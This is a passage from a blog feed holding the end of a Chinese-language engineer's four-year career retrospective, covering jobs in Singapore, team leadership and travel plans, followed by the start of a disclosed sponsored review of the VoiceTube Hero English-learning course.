code。壞處就是雖然自由度極高，但久了之後會開始懷疑自己：「這樣做真的好嗎？有沒有更好的做法？」、「我寫的 code 真的可以嗎？會不會其實都是爛 code」。</p><p>沒有團隊的後果就是如此，沒有人跟你討論或比較，完全不知道自己現在的能力到哪。很快地察覺到這件事情以後，我開始加強自己對「深度」的要求。若是碰到問題，就要盡可能追根究底，試圖完全搞懂問題的成因與解法。理解得越透徹，能力就越強。</p><p>例如說在被公司的資安部門告知有安全漏洞之後，花了點時間研究 CSRF，寫了《<a href="https://github.com/aszx87410/blog/issues/16">讓我們來談談 CSRF</a>》；測試的時候發現 Cookie 居然怎麼寫都寫不進去，在網路上也搜不到相關問題，只好去找 Chromium 的原始碼來看，寫了<a href="https://github.com/aszx87410/blog/issues/17">《我遇過的最難的 Cookie 問題》</a>。</p><p>其他像是<a href="https://github.com/aszx87410/blog/issues/18">《該來理解 JavaScript 的原型鍊了》</a>、<a href="https://github.com/aszx87410/blog/issues/13">《直播協定 hls 筆記》</a>、<a href="https://github.com/aszx87410/blog/issues/19">《輕鬆理解 Ajax 與跨來源請求》</a>、<a href="https://github.com/aszx87410/blog/issues/20">《循序漸進理解 HTTP Cache 機制》</a>也是在類似的背景之下產出的文章。在工作時碰到困難，深入研究並解決，整理想法之後寫下心得。</p><p>這段期間自己的自信心其實也有慢慢提升。自己一個人負責這樣不小的專案也沒問題，寫出來的文章也受到好評，好像比自己想像中還要厲害一點。</p><p>除了技術能力以外，也更認識了自己一些。</p><p>入職大約八九個月之後，我有了想離開的念頭。原因有幾個，第一個是成長曲線大幅減緩。因為專案已經過了最前面那段衝刺期，現在逐漸穩定，除了要修 bug 以及加一些小功能以外，短期內不會有大改版。依舊能學到東西，但我覺得能學到的不多。</p><p>第二個原因很真實，是薪水。原本來這邊的時候我想說虛心學習，畢竟我也沒有多厲害，薪水的部分就沒那麼在意。可是來了之後發現自己把一個專案扛起來，這整個平台的前端就靠我一個人獨立開發，似乎比預期的厲害，而且我的重要性應該是不小的。</p><p>若是能夠獨立負責一整個專案的話，我覺得薪水拿低了。再怎麼想都應該要多個至少 20% 才對。</p><p>第三個原因是語言，在 Garena 裡面我大約八成的時間講中文，兩成的時間講英文。是很舒適沒錯，但這不是長久之計。若是想要爬得更高看得更遠，英文能力是不可或缺的。因此我希望可以找到一個全英文的環境，強迫自己進步。</p><p>綜合以上幾個原因，我決定在新加坡尋找新的機會。我超級緊張，因為這次不一樣了，這次的面試會是全英文的，也要寫一份全英文的履歷。</p><h3 id="2017-年-9-月：第一次在海外找工作"><a href="#2017-年-9-月：第一次在海外找工作" class="headerlink" title="2017 年 9 月：第一次在海外找工作"></a>2017 年 9 月：第一次在海外找工作</h3><p>那時候原本的目標是一些小有名氣的新創公司，例如說 RedMart、Carousell、Zendesk 與 Stripe 等等。</p><p>但有些沒開缺，有些覺得可以晚點再投，最後在 <a href="http://hired.com/">hired.com</a> 上面放了履歷，也親自投了 Stripe。</p><p>有關於這段經歷，我之前寫了一篇長文：<a href="/2017/10/21/stripe-and-i-df35a6f0a799/">《我與 Stripe ：一段愛與夢想的故事》</a>，這邊就不再贅述了。</p><p>雖然說還是對全英文面試感到害怕，但整個過程比我想像中的順利，我的英文好像也沒有差到哪裡去，至少在面試時是能夠溝通的。</p><p>最後成功拿到了一間跨國新創 Eatigo的 offer，職位是資深前端工程師，薪水比之前多了 30%，是個我很滿意的薪水。</p><p>拿到 offer 以後向 Garena 提了離職，雖然公司一再挽留但我心意已決，就算公司之後要上市可能會有股票可以拿，我也沒有想要留下來的打算。對我來說，成長空間才是最重要的，而Eatigo 的環境更適合讓我快速成長。</p><p>離職後回台灣放了兩週的假，再回去時就要迎接新的挑戰了。新的職位、新的環境，以及新的同事們。</p><h3 id="2017-年-11-月：全英文工作環境的挑戰"><a href="#2017-年-11-月：全英文工作環境的挑戰" class="headerlink" title="2017 年 11 月：全英文工作環境的挑戰"></a>2017 年 11 月：全英文工作環境的挑戰</h3><p>先來簡單介紹一下 Eatigo 在做什麼以及技術部門在幹嘛。簡單來說就是一個餐廳訂位服務，與其他人的差別是在我們網站上訂位可以有折扣。你不用先付款、不用買任何券，只要訂位，然後去餐廳吃飯就好了。在結帳的時候就能獲得折扣，依據時段的不同，最高可以打到五折。</p><p><img src="/img/4-years-review-7fb7edc52687/1__zclgSjiW72G__8D19o__NWtg.png"></p><p>想知道更多資訊的話可以參考我之前寫過的：<a href="/2018/03/01/eatigo-128375a0caf/">《東南亞吃飯省錢必備神器：Eatigo》</a>。</p><p>Eatigo 的技術部門分成兩塊，其中一塊在曼谷，那邊有 Android 與 iOS team、設計師、PM 與 QA。另外一塊在新加坡，這邊有後端、前端（網頁前端）、DevOps 跟 CTO。</p><p>我也不知道為什麼要分成兩塊，但總之就是這樣了。新加坡辦公室大概 30 人左右，就是個新創小公司，整個 Eatigo 大概 200 多個人，在東南亞各地基本上都有辦公室。</p><p>新加坡技術部門的組成也是滿多元的，印度、印尼、中國、緬甸、韓國、菲律賓、白俄羅斯、烏克蘭，都來自各個不同的地方，我可能是整個公司唯一一個台灣人。</p><p>剛進公司的時候，第一個碰到的障礙就是語言。雖然說在面試時認知到自己英文沒有想像中的差，可是面試畢竟是一對一又在密閉空間，可以很專心地與對方溝通。日常生活不是這樣的，辦公室隨意聊天、中午吃飯時坐一桌討論文化差異，你要排除周遭的環境音以及雜音，並且在不同人身上切換注意力，英聽能力瞬間降低 50 %。</p><p>還有要習慣大家的口音，所以口音這件事情也是花了不少時間，基本上每天聽就會慢慢習慣了。對我來說這邊的額外福利是免費的英文聽力與口說課程，就算我沒有刻意做什麼，英文能力也會慢慢提升，環境就是這麼神奇的一個東西。</p><p>進來之後的工作內容跟之前面試時講得差不多，Eatigo 正在把整個平台砍掉重練。現在的版本是很久以前外包又自己接回來的，後端是 PHP，前端就是 jQuery 跟一堆雜七雜八的 library。這套系統已經用三四年了，我覺得比較像是當時的一個 MVP，所以許多東西都為了速度沒有考慮維護性，導致維護困難，要加新功能也超級困難。</p><p>因此公司決定把整個專案砍掉重練，後端用 Golang，前端用 React，連 Mobile App 都要打掉重做。所以就是一次大翻新，全部東西都要換掉。我進去的時候後端大概有五個工程師，前端三個，iOS 跟 Android 應該各兩個，現在也是維持差不多的人數。</p><p>你可能會以為前端要負責的只有訂位的那個網站，那你就太天真了。除了這個以外，還要有一個給內部員工使用的後台，可以管理使用者、餐廳等等的資料。也要有一個給餐廳用的網站，讓餐廳可以看到今天的訂單資訊；最後還有一個給 finance team 用的系統，讓他們可以產生發票跟收據，處理跟帳務有關的事情。</p><p>因此前端的工作就是要翻新這四個系統。不過後來因為時程上的因素，公司選擇把內部後台留給我們自己開發，其他三個專案都外包出去再接回來。</p><p>前端包含我一共三個人，只有我的職稱是 senior，其他兩個人都是一般的 engineer，以對 React 的經驗來說，我的確比其他兩個人多了一些。不過大多數的決策我們都會互相討論，不會因為誰比較資深就一定聽誰的。</p><p>剛加入的前幾個月都在做公司的後台系統，起頭是最難的。有一大堆東西需要討論跟決定，而且有些較基礎的東西一但定了，以後就比較難改動了。</p><p>那時我正好在研究 redux-observable，之前看到 Netflix 的人講這套以後就覺得要找個機會來試試，跟同事討論過後把這套帶進來。</p><p>另外也帶了 Prettier，不然光是討論 coding style 的規範就要討論半天，直接交給 Prettier + ESLint 做決定就好，可以省很多時間。</p><p>就這樣做著做著，CTO 覺得我還滿不錯的，就在我過試用期後沒多久，在其中一次的 one on one 問了我這個問題：「你有興趣接前端的 team lead 嗎？有的話我就慢慢把這個職位交給你，之後就由你負責前端 team」</p><p>當下內心第一個反應是：「蛤？真的要交給我嗎？我不行吧！」</p><p>以技術來看的話我覺得 ok，但是 team lead 這個職位除了技術，還需要具備良好的溝通能力。如果是講中文的話我一定毫不猶豫答應，但講英文的話我就退卻三步了。</p><p>說到底，還是語言的問題。從我出國到新加坡工作開始，語言就是一直纏繞著我的一個問題，一直到現在也還是。</p><p>但儘管如此，我的心態已經轉變了。還記得我面試 Garena 後得到的心得嗎？當機會來臨時，先說 yes 就對了，到時候真的做不來再說。</p><p>「好，我願意試試看。」</p><h3 id="2018-年-3-月：從恐懼到不安，再到幻震"><a href="#2018-年-3-月：從恐懼到不安，再到幻震" class="headerlink" title="2018 年 3 月：從恐懼到不安，再到幻震"></a>2018 年 3 月：從恐懼到不安，再到幻震</h3><p>願意試試看是一回事，但是恐懼依然存在著，不會因為你鼓起勇氣接下這個職位就消失。</p><p>跟原本的職位比起來，team lead 要多做些什麼事呢？</p><ol><li>有新功能的時候要跟 PM 先開會，討論規格並安排時程</li><li>安排前端的時程並為其負責</li><li>把 ticket 分給同事，決定分工</li><li>每兩週與 PM 開一次 sprint planning meeting，決定這個 sprint 要做什麼</li><li>每兩週與 PM 開一次 grooming meeting，來討論 backlog 裡面的 ticket</li></ol><p>其實我覺得比起我認知的 team lead，在職務上會比較像是 senior engineer + project manager。在專案的部分做比較多事情，招聘、管人什麼的好像都不關我的事。每間公司的職稱跟職務都不太一樣，至少我的是這樣。</p><p>總之在這個職位上，溝通的部分會比以前多很多，我就是前端組的窗口，有什麼事情都會先來找我。如果只論溝通能力我覺得我很 ok，但溝通這件事情無法只看溝通能力，還需要看語言能力，別人講的你聽不懂、你講的別人聽不懂，再怎麼會溝通也是枉然。</p><p>何況 PM 在曼谷，透過語音及視訊溝通，英聽能力再掉 20%，只剩下八成的功力。</p><p>在接下這個職位後不久，主管派我去曼谷出了一趟差，主要去那邊稍微認識一下同事以及跟 CPO 討論前端的時程，這是我人生中第一次出差。</p><p>但這次出差也是夠衰的了，飛機抵達曼谷時就覺得耳朵很奇怪，怎麼左耳聽到的東西都被蒙上一層薄紗。而且這狀況不像以往打個呵欠之類的就解除了，我試了無數個方法都沒有用。</p><p>因此在跟同事溝通時儘管面對面，依舊是以一個聽力減弱三成的狀況在溝通，要超級無敵專心才能進入狀況。</p><p>一直到三天後出差回來，這狀況都沒有好轉。後來去看醫生，說我有點感冒鼻塞的時候搭飛機，因為巴拉巴拉的關係總之耳朵被一些東西塞住，過兩三個禮拜就會好了。</p><p>雖然說現在講得雲淡風輕，但那時候心理壓力真的不小，主因就是覺得自己英文溝通會有問題，害怕開會聽不懂對方說的話，對開會這件事情感到恐懼。如果有其他同事在還好，真的聽不懂的話同事也會幫忙，但如果只有我一個人就沒辦法了。</p><p>戰戰兢兢地過了三個月左右，慢慢步上軌道，發現自己對開會這件事情也很習慣了。而且 team lead 才需要開的每日例會，前端通常都沒什麼問題要反映，因此我的台詞萬年不變：「nothing from my side, that’s all」</p><p>從那之後，原本的恐懼變成了不安，程度減輕許多。開會時還是會有些許不安，但已經逐漸習慣這種感覺。</p><p>在後台系統差不多完成以後，我們開始接手外包寫的程式碼。老實說品質不是很好，而且有超級多的細節都忽略掉，還有很多一看就知道對 React 不熟才會寫出來的程式碼。</p><p>我跟同事們花了許多時間在重構上面，反正本來就有 bug 要修，就邊修邊重構。之前在 PTT 聽到一句話很中肯：「很多工程師只會重建，不會重構」。有時候重構不一定要全部需求凍結，只為了排一段時間給你專門重構。從日常的修 bug 開始，就可以慢慢把看不順眼的小地方改掉，就算只是一個 function 也行。</p><p>就這樣慢慢改著，專案也變得愈來愈穩定，從外包寫的程式碼裡面我也學到滿多的。雖然案子是同一間公司做的，但是負責的人不一樣，因此不同專案的 style 跟使用的技術也不同。</p><p>就是在這時候我把 redux-thunk、redux-observable 跟 redux-saga 這三套的差異跟用法都搞懂了，因為這三種方式我都看過也用過。雖然我一開始支持 redux-observable，但我最喜歡的其實是 redux-saga。</p><p><img src="/img/4-years-review-7fb7edc52687/1__xLnnEwxGGE3A__kVRp7OQNA.jpeg"></p><p>看了這四個 React + Redux 的專案之後，對這套東西的熟悉度又上了一個層級，慢慢摸索出 Best Practice，也開始研究一些比較底層的東西，用到的 library 如果出問題也不會懼怕，直接去找原始碼來看就好。</p><p>另一方面，也接觸到了很潮的 PWA，理解了背後的原理以及應該如何實作。雖然看起來不難，但實際上很多眉眉角角。也因為要處理 SEO 問題實作了 Server Side Rendering，在增進效能上也花了不少心力。</p><p>雖然說現在的專案還是有許多改進空間，但能變成現在這樣子已經很不容易了。</p><p>2018 年 8 月，新的平台正式上線，舊系統慢慢淘汰，全面轉移到新系統上面，而我們前端負責的四個網站也一次上線，終於完成了一個里程碑。</p><p>經歷過一兩個月的動蕩期之後，產品漸漸穩定下來，不知不覺我擔任 team lead 這個職位已經半年左右了。這時候的感覺已經從不安變成了幻震。</p><p>什麼是幻震？人生三大錯覺：他喜歡我、我能反殺、手機震動。你以為手機有在震動卻沒有，這就叫做幻震。</p><p>換句話說，我還是偶爾會覺得自己好像溝通很差，但實際開會過後又覺得好像沒有。還是有一點不安的成份在，不過程度又減輕許多，頻率就跟感受到幻震差不多。</p><p>大概是同一時間，我開始思考離開新加坡之後要幹嘛。</p><p>咦？跳太快了嗎？怎麼突然就提到要離開新加坡了？</p><p>打從兩年前還在台灣等工作簽證的時候，我就做好這個決定了。我原本就沒有打算在新加坡待太久。至少一年，至多兩年，這是我原本的計畫。</p><p>每個人在工作上追求的東西都不同，我追求的是新鮮感。在新加坡待一陣子之後，我想去其他國家看看。就這樣一個國家待個一兩年，然後前往下一個國家。邊工作邊旅遊，我是這樣打算的。</p><p>當初在 Garena 想離職時，直接離開新加坡也是一個在考慮的選項，但那時想說先找工作好了，找到就繼續待著順便練英文，後來就跑去 Eatigo 了。</p><p>如今 Eatigo 也待了快一年，改版也完成的差不多了。雖然說平時不怎麼出門，但對新加坡也有一定的熟悉程度，可以來想想下一個地方要去哪了。那時最想去的其實是日本 Indeed，就是開頭的 Simon 大大工作的那間，不然的話日本 Line 也可以，想說去那邊順便學日文。去不了日本的話，也想試試看英國，這都是選項之一。</p><p>無論如何，離開新加坡是一定的，只是我還沒想好之後要做什麼而已。大概九月十月的時候，我就跟主管告知這件事了：「安安，我明年一月要離職了，但我不是要跳槽，我要回台灣了。我之後想去其他國家工作，會先回台灣休息一陣子再決定要去哪裡」</p><p>主管有點嚇到，畢竟通常沒什麼人會這麼早講。有些人可能會覺得我很傻，這麼早提的話，bonus 不就沒得領嗎？薪水也不會加，搞不好公司還提前一步把你 fire 掉。</p><p>第一，我對公司有一定的重要性，不可能把我提前 fire 掉，反而還會希望我多留久一點。</p><p>第二，績效獎金的依據應該是去年的績效，而不是我還會在這裡待多久，這是誠信跟道德的問題。當然，這不受法律規範，公司可以因為我要離職就大幅減少給我的獎金，但我同時也能認清這間公司。</p><p>第三，我已經確定要離職了，我覺得越早講越好，公司可以提前做準備開始找人跟規劃之後的時程。而且一但提了，我自己也沒有回頭路了，我還滿喜歡做這種事的。</p><p>總之主管聽到以後說他知道了，感謝我這麼早說（提前三個月），讓他們可以提早做準備。</p><p>後來經過幾次溝通，公司希望我能再多待一陣子，而且四月發獎金，到那時再走是雙贏的局面。我同意了，所以四月是我在新加坡的最後一個月。</p><p>離職以後我到底要幹嘛呢？那時候我有幾個選項在猶豫著：</p><ol><li>試試看去日本工作，投投看 Line 與 Indeed。</li><li>抽英國打工度假簽證，就算沒抽到也可以試試看有沒有公司願意直接辦工作簽。</li><li>挑戰 Google、Facebook 等等這些大魔王</li><li>回台灣創業，專注做程式教學</li><li>面試 ALPHACamp <a href="https://www.yourator.co/companies/ALPHACamp/jobs/5698">課程總監</a>職位</li><li>到處出國旅遊好好放個長假</li><li>閉關修煉一年，好好補強自己的技術</li></ol><p>每一個選項我都覺得很不錯，而且我也都能接受，但就是沒辦法下定決心專注在某一個選項。</p><p>當我想說自己實力不夠，應該要閉關修煉的時候，又會想到之前面試 Garena 的故事，搞不好是因為自己信心不足，應該直接去面試看看。</p><p>當我想出國旅遊放假的時候，會想到 Indeed 的前端缺可不是時時刻刻開著的，搞不好錯過這次要再等個一兩年，機會是不等人的。</p><p>當我想著做 A，就會想到放棄 B 的機會成本，於是遲遲無法下定決心。</p><p>幸好元旦那天掉下一個大禮，讓我不用自己做選擇。</p><h3 id="2019-年-1-月：早起的鳥兒有機票買"><a href="#2019-年-1-月：早起的鳥兒有機票買" class="headerlink" title="2019 年 1 月：早起的鳥兒有機票買"></a>2019 年 1 月：早起的鳥兒有機票買</h3><p>2019 年 1 月 1 號早上九點，跨年夜哪都沒去，待在家睡覺的我依照慣例在這時間醒來。躺在床上滑了一下手機，看到平時就有在追蹤的粉絲專頁發出的貼文，説國泰航空有 Bug 票，越南飛美國的商務跟頭等艙只要 1000 美金。</p><p>以前聽過許多買 bug 票爽爽玩的故事，現在終於要被我碰到了嗎！雖然說航空公司不一定會承認，但有試有機會。於是我從床上跳起來打開電腦，買了一張六月的河內到紐約的商務艙（因為沒有頭等艙）。</p><p>過了三十分鐘，發現這個票價還在，而且一堆網友買到頭等艙，我心裡想說：「不對啊，那我怎麼只買商務」，於是買了第二張機票，七月的河內飛舊金山頭等艙。</p><p>這個 bug 票跟以前的都不一樣，大概持續了半天才被關掉，一大堆網友都買到了。更令人驚訝的是過了幾天，國泰航空居然承認了！</p><p>既然七月都要去美國了，那不如整個下半年都去旅遊吧！就因為這張 bug 票讓我下定了決心，最後選擇了：「到處出國旅遊好好放個長假」這條路。</p><p>在猶豫不決的時候，你需要的不是理性，是衝動。如果這個決定有明顯的優劣之分，你的理性早就幫你做決定了。之所以會猶豫這麼久，就是因為這些選項的價值都差不多，因此需要的是衝動。</p><p>只要一個衝動就可以幫助你做決定，做完決定以後就不要去想其他的路了，因為你已經決定了。</p><p>「當初如果…」都與你無關，因為沒有如果。</p><h3 id="三個關鍵字貫穿四年職涯：實力、溝通、自信"><a href="#三個關鍵字貫穿四年職涯：實力、溝通、自信" class="headerlink" title="三個關鍵字貫穿四年職涯：實力、溝通、自信"></a>三個關鍵字貫穿四年職涯：實力、溝通、自信</h3><p>故事說完了，我沒有預期你會在故事裡獲得什麼。聽個故事而已，沒有得到什麼也無所謂，但接下來我想分享一些我自己的心得。</p><h4 id="實力"><a href="#實力" class="headerlink" title="實力"></a>實力</h4><p>實力會說話，在工程師的世界尤其如此。</p><p>這邊說的實力我指的是技術能力，這是工程師的根本。我同意除了技術能力以外，其他能力也是重要的，但沒有技術能力的工程師不是工程師。</p><p>技術能力是工程師的基礎，也是自信的來源。如果沒有持續進步，那就是退步。我的技術能力在開始工作以後成長幅度才開始增大，因為在工作上你不得不把 bug 解掉，碰到的專案規模跟自己的 side project 也完全不同。</p><p>我一直都相信是金子總會發光，有實力的人才不會被埋沒。尤其是在這個網路時代，你可以利用各種方式讓其他人看見你。</p><p>無論我之後是繼續當個工程師還是慢慢走向管理職，都不能忘記技術能力是工程師之本。要讓別人服你靠的不是名氣、經歷或是學歷，而是能力。</p><h4 id="溝通"><a href="#溝通" class="headerlink" title="溝通"></a>溝通</h4><p>技術能力很重要，但溝通也同等重要。不只要學會講，也要學會聽。我每次在 ticket 裡面回覆問題時都盡量寫得詳細，雖然乍看之下耗時，但其實是最節省時間的方法。若是講得不清不楚，還要再等對方回覆看不懂的地方，然後你再講得更清楚，那為什麼不一開始就講清楚就好。</p><p>若是在專案開發上碰到我覺得不合理的地方，我會直接說出我的理由以及我建議的解法，但要不要採用我交給 PM 來決定，因為我覺得那是他們的專業。</p><p>我覺得很多問題不是產品問題也不是技術問題，是溝通問題，溝通的兩方根本沒有在同一頁上。你講你的他講他的，最後各自堅持自己的想法互不退讓。但重點是，你們其實是有共識的，只是溝通的方式或是方向讓雙方都感受不到這件事。</p><p>想改善的話可以在網路上開始免費教一些新手或者是回答問題，你只要能夠理解問題以及用他聽得懂的方法回答，你就成功一半了。</p><h4 id="自信"><a href="#自信" class="headerlink" title="自信"></a>自信</h4><p>自信真的是靠北難掌握的一個東西。</p><h3 id="2019-年-4-月：新的開始"><a href="#2019-年-4-月：新的開始" class="headerlink" title="2019 年 4 月：新的開始"></a>2019 年 4 月：新的開始</h3><p>就在上週五，我正式從 Eatigo 離職。一年半的時光經歷了不少事情，也從中學到很多。</p><p><img src="/img/4-years-review-7fb7edc52687/1__OG15p__v3gJP__6jwj2ngMWg.jpeg"></p><p>在前天的時候我也從新加坡離開了，現在人已經在台灣，下次再與新加坡見面不知道會是何時。</p><p>我對於即將開始的旅遊計畫有點期待，卻也有點擔心。一年沒碰任何程式的話，應該會生疏不少，而且也不知道世界現在變得怎麼樣了。</p><p>但沒關係，那之後再說吧。有實力的人是不會被埋沒的。</p><p>最後稍微附上我的旅遊行程（詳細行程我還沒排好…好麻煩）。</p><p>如果你剛好在同一時間也在那個地方的話，歡迎私訊我，我們可以吃個飯聊聊天之類的：</p><p>2019–05–08 ~ 2019–05–31 日本（到處跑）<br>2019–06–10 ~ 2019–06–24 紐約<br>2019–06–25 ~ 2019–06–26 河內<br>2019–06–27 ~ 2019–07–14 舊金山<br>2019–09–02 ~ 2019–09–08 阿布達比<br>2019–09–08 ~ 2019–10–13 歐洲（法國、義大利、西班牙、德國）<br>2019–10–13 ~ 2019–10–26 韓國（首爾、釜山）</p><p>不知道未來四年會變成什麼樣子，我一點想像都沒有——這才是最有趣的地方。</p><p>想持續關注的話可以 follow 一下，單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/">Lidemy 粉絲專頁</a>。想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium">https://aszx87410.github.io/blog/medium</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「真正的」看影片學英文：VoiceTube Hero使用心得</title>
      <link href="/2019/04/10/voicetube-hero-review-9409c2248845/"/>
      <url>/2019/04/10/voicetube-hero-review-9409c2248845/</url>
      
        <content type="html"><![CDATA[<p>利益揭露：本文所提到的課程由 VoiceTube 免費提供，並提出心得合作邀請。這是我第一次接到這樣的合作，但儘管如此，使用心得絕對真實。</p><p>2020–10–12 更新：VoiceTube Hero 在近期進行了大改版，因此我也把文章內容更新囉。</p><p>從以前就知道人氣部落格會有一些合作的案子可以接，但身為一個技術型的部落格，我還真沒想過也會有輪到我的一天。前陣子收到 VoiceTube 的合作邀請時嚇了一跳，想說哇嗚居然會找上我。</p><p>合作內容基本上就是分享一下體驗他們這套 VoiceTube Hero 課程的心得。剛好我可以從這套系統裡面尋找一些教學的靈感，而且 VoiceTube 這間公司我也是從小看到大（？），大概三四年前就知道他們了，畢竟新創嘛，比較有名的我多少都聽過。</p><p>總之呢就是很自然地答應了，在分享這套課程的使用心得以前，先來講講自己學英文的相關歷程。</p><p>有關我在學時的英文成績跟故事，之前我都寫在這了：<a href="/2018/06/12/english-174bd9b7c0ce/">我是如何緩慢提升英文能力的？</a></p><p>今天這篇想先來談談：學英文的方式。</p><h3 id="環境的重要性"><a href="#環境的重要性" class="headerlink" title="環境的重要性"></a>環境的重要性</h3><p>有一陣子我把學英文想得很美好，那陣子我查了一堆資料之後整理出一個大家都知道但不一定做得到的，萬年不變的頭號學習技巧：環境。</p><p>就像你三四歲還沒上學就會講中文而且程度還不錯一樣，環境的影響力是很驚人的，把你丟去國外幾個月，讓你每天不得不講、不聽英文，就算你再怎麼抗拒，英文能力還是會有顯著的提升，這就是環境的威力。</p><p>像我來新加坡工作了兩年半，把自己完全丟在一個大部分都是講英文的環境，而且還要熟悉各國口音，英文能力比起還在台灣的我著實是進步了不少，但其實還有一個問題沒解決。</p><p>今天同事講一個單字你聽不懂，隔半年以後你會突然懂嗎？不會。今天你用錯誤的文法寫了一個句子，隔半年之後就會對了嗎？不會。</p><p>差別在哪裡？我想這個差別就是前陣子很夯的一個詞：「刻意練習」，環境能夠幫助你更高頻率地去接收到這些資訊，但很多都是雜訊，你要主動過濾並且學習之後才能變成有意義的資訊。</p><p>舉例來說，我會在 Evernote 上面開一個記事本存説我日常生活碰到卻搞不懂的單字，把那些特別有趣的記錄起來，我之前記了這些：</p><p>chauffeur 司機<br>knock-off 仿冒品（鞋子 包包等）<br>serenade 為…演奏<br>tangerine 橘子<br>ballpark 大概<br>phlegm 痰<br>akin 類似的<br>bail out 跳傘 退出<br>dandy 花花公子 很棒的<br>spectrum 光譜<br>pedigree 家室 家譜<br>woo 追求 求婚<br>bikeshedding 無謂的討論(?)<br>apocryphal 杜撰的<br>nausea 反胃<br>zilch 無 零</p><p>如果不記下來，我第二次聽到還是不會知道那是什麼單字。所以單獨只有環境的話進步有限，想要更進一步，就要靠著有意識地去練習跟培養，而不是被動地去接收環境的雜訊。</p><p>那沒有環境怎麼辦？幫自己製造一個。</p><p>所以有人找語言交換，有人利用線上一對一找老師，也有人選擇看英文小說、看英文電影或是影集等等。</p><p>我之前嘗試過看英文影集這個方法，當初打的如意算盤是：「中英雙語字幕可以學英文，又可以看影集打發時間，根本寓教於樂，天衣無縫啊！」</p><p>結果呢？結果一心不能二用，專心看英文字幕就顧不了劇情，專心看劇情就會一直看中文字幕，根本不知道英文字幕在幹嘛，看完一集之後英文能力還是一點進步都沒有。</p><p>那英文聽力呢？看影集英文聽力總會進步吧？</p><p>不，不一定會。如果不開字幕的話，我怕劇情看不懂，到時候又要再看一次很浪費時間；如果開字幕的話，我就會依靠眼睛而不是耳朵，注意力會放在字幕上面。所以也練不到多少聽力。</p><p>當初聽起來很完美的計劃，卻在實作上徹底的失敗了，這套對我來說一點用都沒有。所以我最後就只是看影集配中文字幕，以看影集為首要目標，把學英文拋諸腦後。</p><p>除了影集，我也有試過看 TED 之類的影片，最後也是落得同樣的下場。「看影片學英文」這回事，如果真的只讓你看影片，最後就真的只是看影片，學英文的部分大概只佔了一兩成，成效十分有限。</p><p>那有沒有一個更好的方式來學英文？有，標題就跟你說了。</p><h3 id="「真正的」看影片學英文：VoiceTube-Hero"><a href="#「真正的」看影片學英文：VoiceTube-Hero" class="headerlink" title="「真正的」看影片學英文：VoiceTube Hero"></a>「真正的」看影片學英文：VoiceTube Hero</h3><p>直接先上兩張圖讓大家快速了解這東西到底在幹嘛：</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__8PMe9v7FzyqyNPxLZUV92w.png"><br><img src="/img/voicetube-hero-review-9409c2248845/1__SYx2EGQDbcoibQTr9X5nnw.png"></p><p>就像我上面說的，「看影片學英文」並不是你只要看了影片就能學到英文（其實還是可以啦，但成果十分有限），而是應該要把「看影片」跟「學英文」這兩件事情一起做，除了看影片以外，還必須要「刻意」學習英文，才能達到最好的成效。</p><p>而 VoiceTube Hero 就是在做這件事情。</p><p>在裡面會有很多堂課，每一堂都以一個影片為核心，在開頭先讓你看影片（可以選擇要不要開字幕，預設是沒開的），看完之後再回答一系列題目，一方面可以加深對影片的印象，另一方面也可以刻意練習英文。</p><p>新版跟舊版比起來，我覺得差異還滿大的，有許多地方都有明顯的進步，像是整個介面都變簡潔而且可愛了！</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__RLKbPEVIq2Q6jFB7VM__C__Q.png"></p><p>在題目的部分，有許多不同的題型，跟舊版比起來，我覺得更加強力道在聽力與口說上面，這是聽力的部分：</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__d3H0O1JoLAQoNRkj__9K__cw.png"></p><p>除了要聽題目選答案以外，選完還會有詳解，詳解除了英文以外也有中文，不需要擔心英文不好會聽不懂。</p><p>除此之外，要練英文聽力的話一直聽絕對是不夠的，這我上面強調過很多次了，想要更進一步就必須刻意練習。假設我同事今天講一句英文我聽不懂，半年後他再講同一句話我就會聽懂嗎？不會。</p><p>但如果我聽十次，而且還把他說的話給寫下來，下次他再講的時候我聽得懂嗎？一定聽得懂。</p><p>而這就是英文聽打在培養的能力，除了「聽進去」以外，你還要聽得懂；除了聽得懂以外，你還要有辦法打出來。我覺得能夠寫出來這件事也滿重要，在新版的 Hero 裡面一樣有聽打的題目，不過難度似乎比舊版低了些</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__weju9SB5WbrvV1X8PDm06g.png"></p><p>再來的話是一些我覺得沒那麼有趣但是也有幫助的題型，例如說配對：</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__cbujoVdWsYiwz__gDdl97HQ.png"><br><img src="/img/voicetube-hero-review-9409c2248845/1__s1zFu__pGMt1STC8zHlxnaQ.png"></p><p>這邊還有一個值得提的點，那就是雖然題型不一樣，但是拿來考試的段落都是差不多的。意思就是考試內容是有精挑細選過的，是他們團隊覺得這支影片的這幾句話可以拿來教學，所以就針對這幾句話來做題目，而不是電腦隨機挑出一個句子讓你填空這麼簡單。</p><p>我覺得這也滿有用的，因為你同樣的段落回答幾次不同的題型之後也會變得更熟悉，等於說是集中火力專攻一個地方。</p><p>除了這些以外，也有特別針對口說來加強。口說的部分可以聽到影片中的發音跟預錄好的他們提供的發音，可以利用跟讀的方式念出來並且重新播放，之後可以自己複習，或者是自己矯正自己的口音。</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__7ymRzJIMJowBsLidSQRiBg.png"></p><p>在口說的部分除了跟著念以外，我最喜歡的部分其實是唸完的時候有個 Hero 小老師會出來講解應該怎麼唸比較好，例如說這句話的連音應該怎麼唸之類的，我覺得這是很棒的一個地方。</p><p>新版還有一個地方很棒，那就是會特別有文法的介紹！</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__w3Jw8d__9x6JzJ__kYi4U6Ng.png"></p><p>另外，跟舊版不同，舊版在每一課的最後都會有字彙表，可以針對剛剛不懂的字彙來複習，每一個單字也都有發音跟例句。新版則是在開頭就出現這個單元要學的單字了。</p><p>還有一個收藏筆記的功能，可以收藏單字或是句子，方便你隨時複習：</p><p><img src="/img/voicetube-hero-review-9409c2248845/1__7c3yH3rRxqPFCg1ezT8p__w.png"></p><p>最後呢，新版有一個學習數據的頁面，可以看到自己學習的資料，介面也很可愛！</p><p><img 